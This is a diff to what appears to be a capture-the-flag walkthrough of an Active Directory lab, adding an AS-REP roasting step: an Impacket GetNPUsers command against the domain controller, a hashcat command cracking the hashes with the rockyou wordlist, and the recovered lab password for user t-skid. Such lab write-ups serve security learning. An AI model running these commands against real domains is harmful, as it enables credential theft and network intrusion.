@@ -12,9 +12,22 @@ __Rid Bruteforce__
 ```
 
 ```txt
-1105: VULNNET-RST\a-whitehat (SidTypeUser)
-1109: VULNNET-RST\t-skid (SidTypeUser)
-1110: VULNNET-RST\j-goldenhand (SidTypeUser)
-1111: VULNNET-RST\j-leet (SidTypeUser)
+a-whitehat
+t-skid
+j-goldenhand
+j-leet
 ```
 
+##### AS-Rep Roasting
+```bash
+GetNPUsers.py vulnnet-rst.local/ -dc-ip $IP -usersfile users.txt
+```
+
+```bash
+hashcat -m 18200 -a 0 hashes.txt ~/git/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt --force -O
+```
+__password__
+t-skid
+```txt
+tj072889*
+```
